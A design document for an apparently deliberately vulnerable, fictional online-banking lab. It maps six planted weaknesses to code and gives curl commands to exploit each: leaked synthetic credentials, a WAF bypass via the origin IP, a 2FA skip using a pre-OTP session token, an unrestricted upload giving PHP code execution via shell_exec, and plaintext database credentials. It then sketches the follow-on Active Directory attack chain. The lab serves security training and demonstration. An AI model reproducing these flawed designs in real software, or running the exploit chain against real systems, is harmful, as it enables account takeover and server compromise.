# Senarath Online Banking — Intentional Weaknesses (V1–V6)

> **LAB ENVIRONMENT.** Every weakness below is built **on purpose** for the
> Senarath Bank CrowdStrike demonstration, per the *Senarath Bank Lab Build
> Guide* (Part A, Web tier, stages 1–8). None is a defect to fix. The bank is
> fictional and all data is synthetic. Keep this environment isolated and
> time-boxed (see `DEPLOY.md` §11).

This document maps each documented weakness to **where it lives in the code**,
**how to verify it**, and the **acceptance test** from the build guide. It is the
web-tier counterpart to the Infrastructure/AD team's D1–D6.

| ID | Weakness | Primary location |
|----|----------|------------------|
| V1 | Leaked credential exists for `ebanking.senarathbank.com` | DB seed (`db/02_seed_customers.sql`) + OSINT seeding (external) |
| V2 | WAF bypass via direct origin IP | Infra/deployment (Apache vhost `deploy/apache/senarath.conf`, origin exposure) |
| V3 | Valid leaked credential logs in | `src/api/login.php` + seed |
| V4 | Broken 2FA — pre-OTP token disclosure | `src/api/login.php`, `src/helpers.php`, `src/includes/auth.php` |
| V5 | Unrestricted file upload → RCE | `src/upload.php` + Apache/mod_php (uploads kept executable) |
| V6 | DB credentials in plaintext environment | `.env`, `src/config.php` |

---

## V1 — Leaked credential for `ebanking.senarathbank.com`

**Goal (guide):** the agent obtains a valid leaked credential and uses it to log in.

**Build:**
- Two synthetic customer logins are seeded as valid accounts in `SenarathLab`:
  - `customer01` / `Welcome123!` (customer no `10293`)
  - `customer02` / `Summer123!` (customer no `10294`)
- These are **synthetic customer accounts, not domain accounts.**
- **External seeding (you do this outside the app):** place one of these in your
  lab's simulated OSINT source — a mock breach/paste dump, a "leaked" file in a
  public code repo, etc. Stage 1 (subdomain enumeration) and V2 (origin IP) are
  the recon targets; the credential is what recon *finds elsewhere*.

**Verify / acceptance:** starting from `senarathbank.com`, the tester obtains the
leaked credential and authenticates at `ebanking.senarathbank.com`.

---

## V2 — WAF bypass via direct origin IP

**Goal (guide):** reach the app directly on the origin IP, with the WAF out of the path.

**Build (infrastructure + the Apache origin):**
- `ebanking.senarathbank.com` (public) points at the **WAF/CDN** (the separate
  `WAF01` appliance in the DMZ). The WAF enforces upload filtering.
- The **origin** (WEB01: Apache serving the ebanking app) also accepts
  **HTTPS/HTTP for `Host: ebanking.senarathbank.com` from any lab source**, not only
  the WAF egress ranges. The Apache vhost routes purely on `ServerName`/`Host` and
  does **no** source-IP restriction and **no** upload filtering.
- Make the origin IP discoverable (a leaked/historical A record, a dev subdomain,
  or an MX/SPF record) — an infra task, see `DEPLOY.md`.

**Verify / acceptance:** a request to the origin IP with `Host: ebanking.senarathbank.com`
returns the app; an upload that the WAF blocks **succeeds** when sent to the origin
directly. Example:

```bash
# Through the WAF (public) — upload filtering applies.
# Direct to origin IP — WAF out of path:
curl -k https://<ORIGIN_IP>/ -H 'Host: ebanking.senarathbank.com'
```

---

## V3 — Valid leaked credential login

**Goal (guide):** the V1 credential authenticates to the banking app.

**Build:**
- `src/api/login.php` performs the password step: it looks up the account by
  username **or** customer number and verifies the password (SHA-256) against the
  seeded hash. The seeded `customer01` / `customer02` accounts exist, are enabled,
  and hold only synthetic data.

**Verify / acceptance:** submitting the leaked credential at the login page
authenticates and reaches the OTP step.

```bash
curl -s -X POST https://ebanking.senarathbank.com/api/login.php \
  -H 'Content-Type: application/json' \
  -d '{"username":"customer01","password":"Welcome123!"}'
```

---

## V4 — Broken 2FA (pre-OTP token disclosure)   ← the headline web flaw

**Goal (guide):** the pre-OTP step returns a usable session token **before** the OTP
is validated, so the second factor is skipped.

**Build:**
- `src/helpers.php → start_session_for()` mints a **fully authenticated** session
  (`authenticated = 1`) the instant the password check passes — *before* any OTP.
- `src/api/login.php` returns that token **and** user data in the response, exactly
  in the flawed shape from the guide (p.21):

  ```json
  POST /api/login.php  →  200
  {
    "ok": true,
    "otpSent": true,
    "sessionToken": "<valid, already-authenticated token>",
    "user": { "id": 10293, "name": "Amal Perera", "accountNo": "701000000001" }
  }
  ```

- `src/includes/auth.php → require_auth() → current_customer()` accepts that session
  for **every** protected page/endpoint and **never** checks `otp_verified`.
- `src/api/verify-otp.php` exists and will set `otp_verified = 1`, but **nothing**
  requires it — the correct design (short-lived pre-auth challenge token, real
  session only after OTP) is intentionally omitted.

**Verify / acceptance:** capture the token from the pre-OTP `/api/login.php` response
and use it to reach authenticated pages/APIs **without** submitting an OTP.

```bash
# 1) Log in (password only) and capture the pre-OTP token:
TOKEN=$(curl -s -X POST https://ebanking.senarathbank.com/api/login.php \
  -H 'Content-Type: application/json' \
  -d '{"username":"customer01","password":"Welcome123!"}' | sed -n 's/.*"sessionToken":"\([^"]*\)".*/\1/p')

# 2) Use it directly against a protected page — no OTP ever submitted:
curl -s https://ebanking.senarathbank.com/dashboard.php -H "Authorization: Bearer $TOKEN" | grep -i "Available"
# (Browser equivalent: after the password step, navigate straight to /dashboard.php.)
```

---

## V5 — Unrestricted file upload → RCE

**Goal (guide):** an authenticated user uploads a file the server executes, giving
RCE. Reached via the origin IP (V2), so the WAF upload filtering is bypassed.

**Build:**
- `src/upload.php` is the "Upload documents" feature. On the origin handler it:
  1. **Accepts any file** — no extension allow-list, no MIME check, no content
     inspection (only `basename()` to stop path traversal *outside* the folder).
  2. **Stores it inside the webroot** at `src/uploads/`, a path Apache serves.
  3. **Preserves the original name/extension**, and Apache/mod_php keeps
     `uploads/` **PHP-executable** (no `.htaccess` disabling PHP). Requesting an
     uploaded `.php` therefore runs it.

**No web shell is shipped in the app** (per guide p.23). The offensive-security
tester supplies their own tooling. Verify the weakness with this **benign** artifact,
which proves code execution by printing a fixed marker and the service account:

```php
<?php echo "LAB-RCE-OK:"; echo trim(shell_exec("whoami")); ?>
```

**Verify / acceptance:** uploading that file via the **origin IP** executes and returns
`LAB-RCE-OK:<service account>`; the same upload is blocked at the WAF.

```bash
# Upload the benign verifier via the origin (using a V4 token, cookie, or logged-in session):
curl -s -X POST https://ebanking.senarathbank.com/upload.php \
  -H 'Host: ebanking.senarathbank.com' -b "sb_session=$TOKEN" \
  -F 'document=@lab_rce_ok.php'

# Request it back — it executes:
curl -s https://ebanking.senarathbank.com/uploads/lab_rce_ok.php
# → LAB-RCE-OK:www-data   (the web container's service account)
```

> Apache runs the web process as **`www-data`**, so the marker shows `www-data`.
> On the Infrastructure team's side (D1/D6) the equivalent origin runs the app as
> `svc_web`; the chain then pivots to MSSQL using the env credentials (V6).

---

## V6 — Database credentials in a plaintext environment variable

**Goal (guide):** after RCE, read working MSSQL credentials from the environment and
pivot to the server segment (stage 9).

**Build:**
- `.env` holds the MSSQL credentials in **plaintext**. On the native host
  `src/config.php` loads `.env` (from the app root, above the webroot) into the
  process environment (`DB_USER`, `DB_PASSWORD`, `DB_HOST`, …).
- `src/config.php` then reads them at runtime with `getenv()`. They are plaintext
  and reachable by anything running as the web user — the `.env` file itself is
  readable from the RCE context, and the values also show in the environment.

**Verify / acceptance:** from the web-shell/RCE context, dumping the environment
reveals MSSQL credentials that authenticate over 1433.

```bash
# From the RCE context (e.g. via an uploaded verifier that runs `env`):
#   DB_HOST=SQL01.senarath.local
#   DB_PORT=1433
#   DB_NAME=SenarathLab
#   DB_USER=lab_app
#   DB_PASSWORD=DbLab123!
```

These credentials authenticate to **SQL01** over TCP 1433 — the handoff into the
Infrastructure/AD team's stage 9 (D1: `xp_cmdshell`).

---

## API & endpoint reference (with weaknesses)

Base URL (lab): `https://ebanking.senarathbank.com` — or the WEB01 origin IP with
`Host: ebanking.senarathbank.com` (that reaches the app with the WAF out of the
path — **V2**).

**Authentication model (this is where V4 lives).** The password step
(`/api/login.php`) mints a session that is **already `authenticated=1`** and hands
the token back *before* OTP. Every protected endpoint accepts that token and
**never checks `otp_verified`**. A token is presented any of three ways
(`helpers.php → session_token()`):
- cookie `sb_session=<token>` (set automatically by `/api/login.php`, HttpOnly), or
- header `Authorization: Bearer <token>`, or
- query string `?token=<token>` (lab convenience — also means the token can leak via URL/logs).

`/api/*` endpoints accept a JSON body or form-encoded fields and return JSON.
Session tokens are 48 hex chars, valid 8 hours.

| Method | Endpoint | Auth | Purpose | Weakness |
|--------|----------|------|---------|----------|
| POST | `/api/login.php` | none | Password step; returns a usable session token | **V3**, **V4** |
| POST | `/api/verify-otp.php` | session | Marks `otp_verified` — **not enforced anywhere** | **V4** |
| GET | `/api/logout.php` | session | Deletes the session, clears cookie | — |
| GET | `/index.php` | none | Login page | — |
| GET | `/otp.php` | session | OTP page (skippable — "Skip to dashboard") | **V4** |
| GET | `/dashboard.php` | session | Account overview | **V4** (token accepted pre-OTP) |
| GET | `/accounts.php` | session | Lists the customer's accounts | **V4** |
| GET | `/transactions.php?acct=<id>` | session | Transactions; `acct` is ownership-checked | **V4** |
| GET/POST | `/transfer.php` | session | Debits a source account, records a txn | **V4** |
| GET/POST | `/beneficiaries.php` | session | `action=add` / `action=del` payees | **V4** |
| GET | `/statements.php?download=<id>` | session | CSV export; `download` is ownership-checked | **V4** |
| GET/POST | `/profile.php` | session | View / update contact details | **V4** |
| POST | `/upload.php` | session | "Upload documents" — stores **any** file in the webroot | **V4** + **V5** |
| GET | `/uploads/<name>` | none | Serves uploaded files; an uploaded `.php` **executes** | **V5** |

> Protected endpoints are ownership-scoped (a customer only sees their own
> accounts, txns, statements, payees). The **only** intentional access flaw is
> **V4** — the pre-OTP token — which every one of them inherits. There is no
> intentional IDOR; don't document one.

### POST `/api/login.php` — password step (V3 + V4)
**Request** (JSON or form): `username` (username **or** customer number), `password`.
```bash
curl -s -X POST https://ebanking.senarathbank.com/api/login.php \
  -H 'Content-Type: application/json' \
  -d '{"username":"customer01","password":"Welcome123!"}'
```
**200** — note the token comes back **before** any OTP (V4):
```json
{
  "ok": true,
  "otpSent": true,
  "sessionToken": "<48-hex, already authenticated>",
  "user": { "id": 10293, "name": "Amal Perera", "accountNo": "701000000001" }
}
```
Errors: `400` missing fields · `401` `{"ok":false,"error":"Invalid username or password."}` · `405` non-POST.
Password check is `SHA-256(password)` compared to the seeded hash (**V3**). The
error is generic (no user-enumeration), which is the one thing done "right" here.

### POST `/api/verify-otp.php` — OTP (cosmetic, V4)
**Request:** `otp` (6 digits). Accepts the per-session code **or** the fixed lab
OTP `114477`. **200** `{"ok":true,"otpMatched":<bool>,"note":"Session is authenticated independent of OTP (lab V4)."}`.
Whether or not it matches, the session already works — `/otp.php` even links
straight to `/dashboard.php`.

### The V4 exploit in two calls
```bash
# 1) password only → capture the pre-OTP token
TOKEN=$(curl -s -X POST https://ebanking.senarathbank.com/api/login.php \
  -H 'Content-Type: application/json' \
  -d '{"username":"customer01","password":"Welcome123!"}' \
  | sed -n 's/.*"sessionToken":"\([^"]*\)".*/\1/p')

# 2) reach any protected endpoint with NO OTP submitted
curl -s https://ebanking.senarathbank.com/dashboard.php -H "Authorization: Bearer $TOKEN" | grep -i available
```

### POST `/upload.php` + GET `/uploads/<name>` — unrestricted upload → RCE (V5)
Multipart field `document`; no extension/MIME/content check; stored under the
webroot at `src/uploads/` with its original name, kept PHP-executable. Requesting
the uploaded file back executes it. Send it to the **origin** (V2) so the WAF
filter is out of the path. Full walkthrough + benign `LAB-RCE-OK` verifier: see
**V5** above. (No web shell ships in the repo — guide p.23.)

---

## Handoff to Part B (Infrastructure / AD team)

The web tier's job ends at **a foothold on WEB01 + working MSSQL credentials**:

```
V1/V3  leaked creds → login
  V4   pre-OTP token → authenticated with no OTP
  V2   origin IP     → WAF out of path
  V5   upload .php   → RCE on WEB01 (as the web service account)
  V6   dump env      → lab_app / DbLab123! for SQL01:1433
        └────────────► Stage 9 (D1 xp_cmdshell) — Infrastructure/AD team
```

D1–D6 (xp_cmdshell, SeImpersonate→SYSTEM, Kerberoast, legacy HR, DA recovery,
krbtgt/diamond ticket) are **host and Active Directory build tasks on SQL01 / HR01 /
DC01**, not web code. See the build guide Part B. The only web-tier dependency they
need is that `lab_app` / `DbLab123!` authenticates to SQL01 on 1433 — which `.env`
and `01_schema.sql` provide.
